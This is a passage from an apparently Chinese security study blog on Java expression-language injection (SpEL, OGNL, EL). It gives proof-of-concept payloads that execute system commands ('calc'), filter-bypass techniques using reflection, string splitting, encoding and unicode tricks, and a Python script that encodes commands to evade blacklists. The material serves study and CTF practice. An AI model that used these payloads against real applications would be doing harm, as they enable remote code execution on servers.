class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PoC原型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Runtime</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line">T(Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ProcessBuilder</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br><span class="line"></span><br><span class="line">******************************************************************************</span><br><span class="line"><span class="comment">// Bypass技巧</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 反射调用</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同上，需要有上下文环境</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同上，需要有上下文环境</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1</span></span><br><span class="line"><span class="comment">// byte数组内容的生成后面有脚本</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">99</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">99</span>&#125;)).start()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2</span></span><br><span class="line"><span class="comment">// byte数组内容的生成后面有脚本</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="number">99</span>).concat(T(java.lang.Character).toString(<span class="number">97</span>)).concat(T(java.lang.Character).toString(<span class="number">108</span>)).concat(T(java.lang.Character).toString(<span class="number">99</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">// JavaScript引擎通用PoC</span></span><br><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;nashorn&quot;</span>).eval(<span class="string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="string">&quot;ng.Run&quot;</span>+<span class="string">&quot;time.getRu&quot;</span>+<span class="string">&quot;ntime().ex&quot;</span>+<span class="string">&quot;ec(s);&quot;</span>)</span><br><span class="line"></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&quot;xxx&quot;</span>),)</span><br><span class="line"></span><br><span class="line"><span class="comment">// JavaScript引擎+反射调用</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)),)</span><br><span class="line"></span><br><span class="line"><span class="comment">// JavaScript引擎+URL编码</span></span><br><span class="line"><span class="comment">// 其中URL编码内容为：</span></span><br><span class="line"><span class="comment">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(java.net.URLDecoder).decode(<span class="string">&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;</span>)),)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 黑名单过滤&quot;.getClass(&quot;，可利用数组的方式绕过，还未测试成功</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;class&#x27;</span>].forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getDeclaredMethods()[<span class="number">15</span>].invoke(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;class&#x27;</span>].forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getDeclaredMethods()[<span class="number">7</span>].invoke(<span class="literal">null</span>),<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// JDK9新增的shell，还未测试</span></span><br><span class="line">T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(<span class="string">&quot;jdk.jshell.JShell&quot;</span>,<span class="literal">true</span>).Methods[<span class="number">6</span>].invoke(<span class="literal">null</span>,&#123;&#125;).eval(<span class="string">&#x27;whatever java code in one statement&#x27;</span>).toString()</span><br></pre></td></tr></table></figure><p><a href="http://CreateAscii.py">CreateAscii.py</a>，用于String类动态生成字符的字符ASCII码转换生成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">message = <span class="built_in">input</span>(<span class="string">&#x27;Enter message to encode:&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Decoded string (in ASCII):\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;T(java.lang.Character).toString(%s)&#x27;</span> % <span class="built_in">ord</span>(message[<span class="number">0</span>]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;.concat(T(java.lang.Character).toString(%s))&#x27;</span> % <span class="built_in">ord</span>(ch), end=<span class="string">&quot;&quot;</span>), </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;new java.lang.String(new byte[]&#123;&#x27;</span>, end=<span class="string">&quot;&quot;</span>),</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">ord</span>(message[<span class="number">0</span>]), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;,%s&#x27;</span> % <span class="built_in">ord</span>(ch), end=<span class="string">&quot;&quot;</span>), </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;)&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>一些bypass技巧：</p><p>参考：<a href="https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/">https://boogipop.com/2023/08/06/SPEL</a></p><h2 id="OGNL是什么？">OGNL是什么？</h2><p>先来看一个例子:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Class SchoolMaster&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;wanghua&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class School</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;tsinghua&quot;</span>;</span><br><span class="line">    SchoolMaster schoolMaster;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Student</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;xiaoming&quot;</span>;</span><br><span class="line">    School school;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建实例学校school = new School()、学生student = new Student()和校长schoolMaster = new SchoolMaster()，将学校校长指定为schoolMaster实例-school.schoolMaster = schoolMaster，学生的学校指定为school实例-student.school = school，那么三者就连接起来了形成了一个对象图，对象图基本可以理解为对象之间的依赖图。通过对象图我们可以获取到对象的属性甚至对象的方法。</p><p>那么OGNL就是实现对象图导航语言，全称Object-Graph Navigation Language。通过它我们可以存取 Java对象的任意属性、调用 Java 对象的方法以及实现类型转换等。</p><h3 id="OGNL三元素">OGNL三元素</h3><p>OGNL基本使用方法示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建Student对象</span></span><br><span class="line"><span class="type">School</span> <span class="variable">school</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">School</span>();</span><br><span class="line">school.setName(<span class="string">&quot;tsinghua&quot;</span>);</span><br><span class="line">school.setSchoolMaster(<span class="keyword">new</span> <span class="title class_">SchoolMaster</span>(<span class="string">&quot;wanghua&quot;</span>));</span><br><span class="line"><span class="type">Student</span> <span class="variable">student1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">student1.setName(<span class="string">&quot;xiaoming&quot;</span>);</span><br><span class="line">student1.setSchool(school);</span><br><span class="line"><span class="type">Student</span> <span class="variable">student2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">student2.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">student2.setSchool(school);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建上下文环境</span></span><br><span class="line"><span class="type">OgnlContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OgnlContext</span>();</span><br><span class="line"><span class="comment">// 设置跟对象root</span></span><br><span class="line">context.setRoot(student1);</span><br><span class="line">context.put(<span class="string">&quot;student2&quot;</span>, student2);</span><br><span class="line"><span class="comment">// 获取ognl的root相关值</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">name1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;name&quot;</span>, context, context.getRoot());</span><br><span class="line"><span class="type">Object</span> <span class="variable">school1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;school.name&quot;</span>, context, context.getRoot());</span><br><span class="line"><span class="type">Object</span> <span class="variable">schoolMaster1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;school.schoolMaster.name&quot;</span>, context, context.getRoot());</span><br><span class="line">System.out.println(name1 + <span class="string">&quot;:学校-&quot;</span> + school1 + <span class="string">&quot;,校长-&quot;</span>+schoolMaster1);</span><br><span class="line"><span class="comment">// 获取ognl非root相关值</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">name2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#student2.name&quot;</span>, context, context.getRoot());</span><br><span class="line"><span class="type">Object</span> <span class="variable">school2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#student2.school.name&quot;</span>, context, context.getRoot());</span><br><span class="line"><span class="type">Object</span> <span class="variable">schoolMaster2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;#student2.school.schoolMaster.name&quot;</span>, context, context.getRoot());</span><br><span class="line">System.out.println(name2 + <span class="string">&quot;:学校-&quot;</span> + school2 + <span class="string">&quot;,校长-&quot;</span>+schoolMaster2);</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xiaoming:学校-tsinghua,校长-wanghua</span><br><span class="line">zhangsan:学校-tsinghua,校长-wanghua</span><br></pre></td></tr></table></figure><p>不难看出，OGNL getValue需要三元素：expression表达式、context上下文及root对象。那么什么是三元素：</p><p>expression表达式：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；<br>root根对象：OGNL的Root对象可以理解为OGNL的操作对象。当OGNL通过表达式规定了“干什么”以后，还需要指定对谁进行操作；<br>context上下文对象：context以MAP的结构、利用键值对关系来描述对象中的属性以及值，称之为OgnlContext，可以理解为对象运行的上下文环境，其实就是规定OGNL的操作在哪里。</p><p>在上面示例中，根对象是student1实例，context中设置了根对象和非根对象student2，表达式有name、<a href="http://school.name">school.name</a>、<a href="http://school.schoolMaster.xn--namestudent2-1l2u.name">school.schoolMaster.name和student2.name</a>、#<a href="http://student2.school.name">student2.school.name</a>、<a href="http://student2.school.schoolMaster.name">student2.school.schoolMaster.name</a>，前三个是通过表达式获取root也就是student1对象的相关属性，后三个是通过表达式获取容器变量student2对象的相关属性。</p><h3 id="OGNL表达式语法">OGNL表达式语法</h3><h4 id="符号的使用：">符号的使用：</h4><p>在上一部分我们已经接触了.和#符号在表达式中的使用，通过.可以获取对象属性，#可以获取非root的Student对象。</p><p>OGNL表达式支持Java基本运算，所以运算符+、-、*、/、%等在OGNL都是支持的，另外还支持in、eq、gt等。</p><p>除了基本运算符，.、@、#在OGNL中都有特殊含义。</p><p>1、通过.获取对象的属性或方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">student</span><br><span class="line">student.name</span><br><span class="line">student.school</span><br><span class="line">student.school.name</span><br><span class="line">student.takingClasses(<span class="string">&quot;英语&quot;</span>)</span><br></pre></td></tr></table></figure><p>2、三种类型对象的获取：</p><p>静态对象、静态方法和静态变量：@</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span></span><br><span class="line"><span class="meta">@java</span>.lang.Math<span class="meta">@abs(-111)</span></span><br></pre></td></tr></table></figure><p>非原生类型对象：#</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#student.name</span><br><span class="line">#student.takingClasses(<span class="string">&quot;英语&quot;</span>)</span><br></pre></td></tr></table></figure><p>简单对象：直接获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;string&quot;</span>.lenth</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure><p>3、%符号的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。</p><p>4、$在配置文件中引用OGNL表达式。</p><h3 id="集合表达式：">集合表达式：</h3><p>new创建实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.String(<span class="string">&quot;testnew&quot;</span>)</span><br></pre></td></tr></table></figure><p>{}和[]的用法：</p><p>在OGNL中，可以用{}或者它的组合来创建列表、数组和map，[]可以获取下标元素。</p><p>创建list：{value1,value2…}</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>&#125;[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>创建数组：new type[]{value1,value2…}</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>&#125;[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>创建map：#{key:value,key1:value1…}</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>,<span class="string">&quot;school&quot;</span>:<span class="string">&quot;tsinghua&quot;</span>&#125;[<span class="string">&quot;school&quot;</span>]</span><br></pre></td></tr></table></figure><p>除了一些符号和集合，还支持Projection投影和Selection选择等，具体可参考官方文档：<a href="https://commons.apache.org/proper/commons-ognl/language-guide.html">https://commons.apache.org/proper/commons-ognl/language-guide.html</a> 附录Operators部分。</p><h3 id="命令执行调试分析">命令执行调试分析</h3><p>通过上面表达式的学习我们很容易能够写出Java执行命令的表达式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//使用runtime执行系统命令</span></span><br><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用processbuilder执行系统命令</span></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)).start()</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用反射调用runtime执行系统命令</span></span><br><span class="line">$&#123;(#runtimeclass=#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)).(#getruntimemethod=#runtimeclass.getDeclaredMethods([<span class="number">7</span>]).(#rtobj=#getruntimemethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>)).(#execmethod=#runtimeclass.getDeclaredMethods([<span class="number">14</span>]).(#execmethod.invoke(#rtobj,<span class="string">&quot;cmd&quot;</span>))&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用Jshell执行java代码(jdk9及以后)</span></span><br><span class="line"><span class="meta">@jdk</span>.jshell.Jshell<span class="meta">@create()</span>.eval(<span class="string">&#x27;code&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关键字绕过</p><p>假如题目中对用户的输入进行了关键字的黑名单(以new为例)，那么实际上我们可以使用unicode字符进行绕过:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;(\u006eew java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;</span>calc<span class="string">&quot;&#125;)).start()&quot;</span>;</span><br><span class="line">Ognl.getValue(str, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>那么假如存在一个正则表达式\u\d{4}，将对应的unicode先解析了一遍，再进行黑名单，还有方法绕过吗？实际上这里又存在一个trick，即\uxxxx中的u是可以写一个或多个的，具体原因在于ognl.JavaCharStream#readChar方法中:<br><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713112336109-19a6d25f-f49f-4c34-816f-f8dc579b2c2c.png" alt=""><br>所以上述OGNL表达式可以改写为:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;(\uuuuuuuuuuuuuuuu006eew java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;</span>calc<span class="string">&quot;&#125;)).start()&quot;</span>;</span><br><span class="line">Ognl.getValue(str, <span class="literal">null</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考：<a href="https://xz.aliyun.com/t/10482">https://xz.aliyun.com/t/10482</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/</a></p><p><a href="https://paper.seebug.org/794/#0x03-ognl">https://paper.seebug.org/794/#0x03-ognl</a></p><p><a href="https://www.freebuf.com/vuls/168609.html">https://www.freebuf.com/vuls/168609.html</a></p><p><a href="https://chenlvtang.top/2022/08/11/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%B9%8BOGNL/">https://chenlvtang.top/2022/08/11/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%B9%8BOGNL/</a></p><h2 id="EL简介">EL简介</h2><p>EL（Expression Language） 是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。</p><p>EL表达式主要功能如下：</p><ul><li>获取数据：EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据（某个Web域中的对象，访问JavaBean的属性、访问List集合、访问Map集合、访问数组）；</li><li>执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算，例如${user==null}；</li><li>获取Web开发常用对象：EL表达式定义了一些隐式对象，利用这些隐式对象，Web开发人员可以很轻松获得对Web常用对象的引用，从而获得这些对象中的数据；</li><li>调用Java方法：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法；</li></ul><h3 id="基本语法">基本语法</h3><h3 id="EL语法">EL语法</h3><p>在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以${}表示。例如，${ userinfo}代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：${ pageScope. userinfo}表示访问page范围中的userinfo变量。</p><p>简单地说，使用EL表达式语法：${EL表达式}</p><p>其中，<strong>EL表达式和JSP代码等价转换</strong>。事实上，可以将EL表达式理解为一种简化的JSP代码。</p><p>扩展JSP代码的写法总结：</p><ul><li>JSP表达式：&lt;%=变量或表达式&gt;向浏览器输出变量或表达式的计算结果。</li><li>JSP脚本：&lt;%Java代码%&gt;执行java代码的原理：翻译到_jspService()方法中。</li><li>JSP声明：&lt;%!变量或方法%&gt;声明jsp的成员变量或成员方法。</li><li>JSP注释：&lt;%!–JSP注释–%&gt;用于注释JSP代码，不会翻译到Java文件中，也不会执行。</li></ul><h3 id="与-运算符">[ ]与.运算符</h3><p>EL表达式提供.和[]两种运算符来存取数据。</p><p>当要存取的属性名称中包含一些特殊字符，如.或-等并非字母或数字的符号，就一定要使用[]。例如：${user.My-Name}应当改为${user[“My-Name”]}。</p><p>如果要动态取值时，就可以用[]来做，而.无法做到动态取值。例如：${sessionScope.user[data]}中data 是一个变量。</p><h3 id="变量">变量</h3><p>EL表达式存取变量数据的方法很简单，例如：${username}。它的意思是取出某一范围中名称为username的变量。因为我们并没有指定哪一个范围的username，所以它会依序从Page、Request、Session、Application范围查找。假如途中找到username，就直接回传，不再继续找下去，但是假如全部的范围都没有找到时，就回传&quot;&quot;。EL表达式的属性如下：</p><table><thead><tr><th><strong>属性范围在EL中的名称</strong></th><th></th></tr></thead><tbody><tr><td>Page</td><td>PageScope</td></tr><tr><td>Request</td><td>RequestScope</td></tr><tr><td>Session</td><td>SessionScope</td></tr><tr><td>Application</td><td>ApplicationScope</td></tr></tbody></table><p>JSP表达式语言定义可在表达式中使用的以下文字：</p><table><thead><tr><th><strong>文字</strong></th><th><strong>文字的值</strong></th></tr></thead><tbody><tr><td>Boolean</td><td>true 和 false</td></tr><tr><td>Integer</td><td>与 Java 类似。可以包含任何整数，例如 24、-45、567</td></tr><tr><td>Floating Point</td><td>与 Java 类似。可以包含任何正的或负的浮点数，例如 -1.8E-45、4.567</td></tr><tr><td>String</td><td>任何由单引号或双引号限定的字符串。对于单引号、双引号和反斜杠，使用反斜杠字符作为转义序列。必须注意，如果在字符串两端使用双引号，则单引号不需要转义。</td></tr><tr><td>Null</td><td>null</td></tr></tbody></table><h3 